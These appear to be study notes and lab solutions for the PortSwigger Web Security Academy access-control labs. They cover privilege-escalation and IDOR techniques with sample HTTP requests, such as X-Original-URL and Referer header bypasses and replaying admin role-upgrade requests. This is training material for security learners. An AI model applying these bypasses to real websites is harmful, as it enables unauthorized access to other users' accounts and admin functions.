# Portswigger's Web Security Academy

Notes and ```lab``` solutions/hints.

Read the actual solutions (upsolve).

## Access Control

- **Authentication** identifies the user and confirms that they are who they say they are.
- **Session management** identifies which subsequent HTTP requests are being made by that same user.
- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

### User's perspective:

1. Vertical access controls
2. Horizontal access controls
3. Context-dependent access controls

### Parameter-based access control methods: hidden field, cookie, preset query string

```
Unprotected admin functionality: robots.txt
Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
User role controlled by request paramter: login as wiener/peter => go to /admin
User role can be modified in user profile: 
```

### Platform misconfiguration:
- Restricting certain URLs
- Restricting certain HTTP methods
- *Custom http headers to override restricted urls*

```
URL-based access control can be circumvented

POST / HTTP/1.1
Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
X-Original-URL: /admin
```

```
Method-based access control can be circumvented

Login as wiener/peter:
PUT /admin-roles HTTP/1.1
Cookie: session=UdlpEENsbTjmMhi15gFrGZLzPJlprpTK
username=wiener&action=upgrade
```

### Horizontal Privilege Escalation

```
User ID controlled by request parameter

Login as wiener/peter:
/my-account?id=carlos

Copy and submit the API key
```

```
User ID controlled by request parameter, with unpredictable user IDs 

Login as wiener/peter:
Go to /post?postId=3, to find carlos' userId.
User that userId to get API key from My Account page.

```

```
User ID controlled by request parameter with data leakage in redirect

Login as wiener/peter
Go to /my-account?id=carlos => it redirects back to home page
Go to /my-account?id=carlos and intercept the response in Burp
Before redirection, the API key for carlos is leaked.
```

### Horizontal to vertical privilege escalation

```
User ID controlled by request parameter with password disclosure

Login as wiener/peter
Go to /my-account?user=administrator
Change input type of password to text
Login as administrator/xj6efi
Delete carlos
```

### Insecure direct object references

When an application uses user-supplied input to access objects directly.

```https://insecure-website.com/customer_account?customer_number=132355```

IDOR vulnerabilities often arise when sensitive resources are located in static files on the server-side filesystem. 

``` https://insecure-website.com/static/12144.txt```

```
Insecure Direct Object References

Login as wiener/peter
Go to /chat and Download Transcript
Intercept request in Burp to see that transcript is being downloaded from /download-transcript/2.txt
Go to /download-transcript/1.txt
Get carlos' password: qahe69
Login to carlos' account
```

### Access control vulnerabilities in multi-step processes

```
Multi-step process with no access control on one step

Login as adminstrator/admin
Observe request for upgrading a user:

POST /admin-roles HTTP/1.1
action=upgrade&confirmed=true&username=wiener

Repeat the request while logged in as wiener
```

### Referer-based access control

```
Login as administrator/admin
Go to /admin
Upgrade a user and intercept the request in Burp

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://ace91fd81fbaa096804b8c630061001c.web-security-academy.net/admin

Login as wiener/peter and send the request.

```

### Location-based access control

Circumvented using web proxies, VPNs, or manipulation of client-side geolocation mechanisms.

-----
